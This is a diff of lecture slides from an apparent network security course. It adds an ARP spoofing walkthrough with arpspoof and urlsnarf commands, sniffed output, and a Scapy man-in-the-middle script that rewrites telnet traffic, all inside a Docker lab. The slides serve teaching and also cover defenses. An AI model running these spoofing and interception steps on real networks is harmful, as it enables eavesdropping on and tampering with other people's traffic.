@@ -56,6 +56,7 @@
 [Address Resolution Protocol (ARP)](#/arpdesc)  
 [ARP Spoofing](#/spoofing)  
 [Spoofing Defenses](#/defenses)  
+[MITM with ARP](#/mitmarp)  
 </textarea></section>
   
 <!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
@@ -887,21 +888,30 @@ root@outer2:/#
 - Install both `netdiscover` and `arpspoof`
   - They are in the `netdiscover` and `dsniff` packages on Ubuntu
   - And they are already installed on the Docker image
-- Ensure the machine that is doing the spoofing can forward IP packets:
+
+
+
+## Ensure outer1 can forward IP
+- Check if outer1, the node that is doing the spoofing, can forward IP packets:
+```
+$ cat /proc/sys/net/ipv4/ip_forward
+1
+$
+```
+- If not, enable outer1 to forward IP packets:
   <pre><code>echo 1 > /proc/sys/net/ipv4/ip_forward</code></pre>
-  - Already done on the Docker image
 - To start, load up five different tabs (yes, really five)
 
 
 
 ## How to do it
 
-<img src='../docker/network_compact_for_arp_normal.svg' style="float:left;width:45%">
-<img src='../docker/network_compact_for_arp_spoofed.svg' style="float:right;width:45%">
+<img src='../docker/network_compact_for_arp_normal_outer2.svg' style="float:left;width:45%">
+<img src='../docker/network_compact_for_arp_spoofed_outer2.svg' style="float:right;width:45%">
 
 - The following directions are for our [course docker setup](../docker/network.svg)
-- We are going to have `outer1` spoof (intercept the packets for) `outer2`
-- We will run `urlsnarf` on `outer1`
+- We are going to have *outer1* spoof (intercept the packets for) *outer2*
+- We will run `urlsnarf` on *outer1*
   - This will display URLs it sees in the intercepted packets
 </textarea></section>
 
@@ -909,20 +919,26 @@ root@outer2:/#
 ## How to do it
 - Tab 1: run the docker setup:
   <pre><code>docker-compose up</code></pre>
-- Tab 2: connect to `outer1` and run:
-  <pre><code>arpspoof -i eth0 -t 192.168.100.102 192.168.100.1</code></pre>
-- Tab 3: connect to `outer1` and run (note reversed!):
-  <pre><code>arpspoof -i eth0 -t 192.168.100.1 192.168.100.102</code></pre>
-- Tab 4: connect to `outer1` and run:
-  <pre><code>urlsnarf -i eth0</code></pre>
-- Tab 5: wait a minute, then connect to `outer2` and run:
+- Tab 2: connect to *outer1* and run (note `eth1`):
+  <pre><code>arpspoof -i eth1 -t 192.168.100.102 192.168.100.1</code></pre>
+- Tab 3: connect to *outer1* and run (note reversed):
+  <pre><code>arpspoof -i eth1 -t 192.168.100.1 192.168.100.102</code></pre>
+- Tab 4: connect to *outer1* and run:
+  <pre><code>urlsnarf -i eth1</code></pre>
+- Tab 5: wait a minute, then connect to *outer2* and run:
   <pre><code>wget -q http://google.com</code></pre>
 </textarea></section>
 
-<section data-markdown data-separator="^\n\n\n"><textarea data-template>
+<section data-markdown data-separator="^\n\n\n" class="pre-wide"><textarea data-template>
 ## How to do it
 - When running `wget` from outer2, any `http://` address will appear in the `urlsnarf` output
   - There is often a few seconds of delay
+```
+root@outer1:/# urlsnarf -i eth1
+urlsnarf: listening on eth1 [tcp port 80 or port 8080 or port 3128]
+outer2 - - [23/Jan/2024:12:10:56 -0500] "GET http://google.com/ HTTP/1.1" - - "-" "Wget/1.21.2"
+outer2 - - [23/Jan/2024:12:10:56 -0500] "GET http://www.google.com/ HTTP/1.1" - - "-" "Wget/1.21.2"
+```
 - But notice that an `https://` address will *not* appear
   - As the URL request is sent in an AES-encrypted packet, so `urlsnarf` cannot read it
 </textarea></section>
@@ -964,6 +980,144 @@ root@outer2:/#
 ## Prevention
 - If the gateway has hard-coded IPs for MACs, then it can't be fooled by an ARP spoof
 - Usually in the DHCP server settings in the gateway setup
+
+
+
+## Upcoming assignment
+- In the ARP Spoofing assignment, you will have to write a detector that will notify (print) if an ARP spoof is detected
+</textarea></section>
+
+</section>
+
+<!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
+
+<section>
+
+<section data-markdown id="mitmarp" class="center"><textarea data-template>
+# MITM with ARP
+</textarea></section>
+    
+<section data-markdown data-separator="^\n\n\n"><textarea data-template>
+<!-- .slide: class="right-float-img-600" -->
+## MITM with ARP
+![](../docker/network_compact_for_arp_normal_metasploit.svg)
+- We are going to change all instances of 'foo' to 'bar'
+- We'll use unencrypted telnet, and change text in the response (only)
+- We will spoof *metasploit*, as it has a running telnet server
+- We'll telnet in from *firewall*
+- The packet interception program will be running on *outer1*
+
+
+
+## Setup
+- As we want to intercept and modify the packets, we have to turn off IP forwarding:
+  <pre><code>echo 0 > /proc/sys/net/ipv4/ip_forward</code></pre>
+  - Otherwise, the packets get forwarded before we can intercept them
+- Run the `arpspoof` in two tabs on *outer1*:
+  <pre><code>arpspoof -i eth1 -t 192.168.100.3 192.168.100.1</code></pre>
+  <pre><code>arpspoof -i eth1 -t 192.168.100.1 192.168.100.3</code></pre>
+  - Same commands as before, but we are spoofing *metasploit* (.3) instead of *outer2* (.102)
+
+
+
+## Scapy Python library
+- Home page at [scapy.net](https://scapy.net)
+- A "powerful Python-based interactive packet manipulation program and library"
+  <pre><code class='python'>from scapy.all import *</code></pre>
+- Uses `/` for layer stacking: 
+  <pre><code class='python'>frame = Ether() / IP</code></pre>
+- Already installed on the Docker images
+
+
+
+<!-- .slide: class="smaller-pre" -->
+## [arp_mitm.py](code/arp_mitm.py.html) ([src](arp_mitm.py))
+```python
+def spoof_pkt(pkt):
+
+  if pkt[IP].src == VICTIM_IP and pkt[IP].dst == FIREWALL_IP:
+    newpkt = IP(bytes(pkt[IP]))
+    del(newpkt.chksum)
+    del(newpkt[TCP].payload)
+    del(newpkt[TCP].chksum)
+
+    if pkt[TCP].payload:
+      data = pkt[TCP].payload.load
+      newdata = data.replace(b'foo',b'bar')
+      if newdata != data:
+        print("replaced")
+      send(newpkt/newdata)
+    else:
+      send(newpkt)
+
+  elif pkt[IP].src == FIREWALL_IP or pkt[IP].dst == VICTIM_IP:
+    newpkt = IP(bytes(pkt[IP]))
+    del(newpkt.chksum)
+    del(newpkt[TCP].chksum)
+    send(newpkt)
+
+filter = "tcp and (ether src " + FIREWALL_MAC + " or ether src " + VICTIM_MAC + ")"
+pkt = sniff(iface='eth1', filter=filter, prn=spoof_pkt)
+```
+
+
+
+## Final setup
+- Run [arp_mitm.py](code/arp_mitm.py.html) ([src](arp_mitm.py)) on *outer1*
+- Note there are more comments in the linked version of the code
+
+
+
+<!-- .slide: class="small-pre wide-pre" -->
+## The effect
+```
+root@firewall:/# telnet metasploit
+Trying 192.168.100.3...
+Connected to metasploit.
+Escape character is '^]'.
+
+...
+
+metasploit login: msfadmin
+Password: 
+Last login: Tue Jan 23 12:56:08 EST 2024 from firewall on pts/1
+Linux 32554753bfe5 4.13.0-21-generic #24-Ubuntu SMP Mon Dec 18 17:29:16 UTC 2017 x86_64
+
+...
+
+No mail.
+msfadmin@metasploit:~$ echo foo
+bar
+msfadmin@metasploit:~$ echo "A fool Footman's foot needs footwear to get a foothold."
+A barl Footman's bart needs bartwear to get a barthold.
+msfadmin@metasploit:~$ exit
+logout
+Connection closed by foreign host.
+root@firewall:/# 
+```
+
+
+
+## Output on `outer1`
+```
+root@outer1:/# python3 /mnt/arp_mitm.py 
+.
+Sent 1 packets.
+.
+Sent 1 packets.
+
+...
+
+Sent 1 packets.
+.
+Sent 1 packets.
+replaced
+.
+Sent 1 packets.
+.
+
+(and so on)
+```
 </textarea></section>
 
 </section>
